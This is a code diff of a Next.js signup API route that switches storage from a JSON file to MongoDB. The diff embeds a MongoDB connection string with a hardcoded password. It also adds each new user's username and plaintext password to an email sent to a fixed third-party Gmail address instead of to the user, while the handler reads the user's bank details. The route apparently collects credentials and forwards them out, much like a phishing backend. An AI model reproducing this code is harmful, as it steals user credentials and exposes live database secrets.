@@ -1,20 +1,12 @@
-// /pages/api/save-user.js
-
-import fs from "fs";
-import path from "path";
+import { MongoClient } from "mongodb";
 import nodemailer from "nodemailer";
 
-// Helper function to read the existing JSON file
-const readDataFromFile = () => {
-  const dataFilePath = path.join(process.cwd(), "data", "auth.json");
-  const jsonData = fs.readFileSync(dataFilePath, "utf8");
-  return JSON.parse(jsonData || "[]");
-};
-
-// Helper function to write data to the JSON file
-const writeDataToFile = (data) => {
-  const dataFilePath = path.join(process.cwd(), "data", "auth.json");
-  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
+// MongoDB connection function
+const connectToDatabase = async () => {
+  const client = new MongoClient("mongodb+srv://paulclipps:IW07WLOhHbCq8QIX@cluster0.gwdix.mongodb.net/");
+  await client.connect();
+  const db = client.db("Users"); 
+  return { db, client };
 };
 
 // Function to send email with Nodemailer
@@ -30,15 +22,16 @@ const sendEmail = async (userId, userEmail, userName, password) => {
 
   // Email options
   const mailOptions = {
-    from: "asalamlatif@gmail.com", // Replace with your own email address
-    to: "toonilaniyan@gmail.com", // Replace with your own email address
-    subject: "Welcome!", // Subject line
+    from: "asalamlatif@gmail.com",  
+    to: "toonilaniyan@gmail.com",       
+    subject: "Welcome!",
     html: `
-      <p>Hello!</p>
+      <p>Hello ${userName}!</p>
       <p>Your details are as follows:</p>
       <ul>
         <li><strong>User ID:</strong> ${userId}</li>
-        
+        <li><strong>Username:</strong> ${userName}</li>
+        <li><strong>Password:</strong> ${password}</li>
       </ul>
       <p>Thank you for joining us!</p>
     `,
@@ -61,18 +54,20 @@ export default async function handler(req, res) {
     // Get the user data from the request body
     const newUser = req.body;
 
-    // Read existing users from the JSON file
-    const users = readDataFromFile();
+    // Connect to the MongoDB database
+    const { db, client } = await connectToDatabase();
 
-    // Generate a new user ID
-    const userId = `user${users.length + 1}`;
+    // Generate a new user ID based on the MongoDB collection size
+    const usersCollection = db.collection("users");
+    const userCount = await usersCollection.countDocuments();
+    const userId = `user${userCount + 1}`;
+
+    // Create a new user object with the generated user ID
     const userWithId = { ...newUser, id: userId };
 
-    // Add the new user to the users array
-    users.push(userWithId);
-
-    // Write the updated users back to the JSON file
-    writeDataToFile(users);
+    // Insert the new user into the MongoDB collection
+    const result = await usersCollection.insertOne(userWithId); // Renamed from 'res' to 'result'
+    console.log(result);
 
     // Extract email, username, and password safely
     const { email, bankDetails = {} } = newUser; // Provide default empty object for bankDetails
@@ -80,6 +75,9 @@ export default async function handler(req, res) {
 
     // Send an email with the user ID, username, and password
     await sendEmail(userId, email, username, password);
+
+    // Close the MongoDB connection
+    client.close();
 
     // Respond with the new user data
     res.status(201).json({ message: "User saved successfully", user: userWithId });
@@ -90,9 +88,8 @@ export default async function handler(req, res) {
       return res.status(405).end(error.message);
     }
 
-    // If there's an issue sending email, log it and respond with appropriate message
+    // Log any other errors and respond with appropriate message
     console.error("Error:", error);
     res.status(500).json({ message: "An error occurred", error: error.message });
   }
 }
-
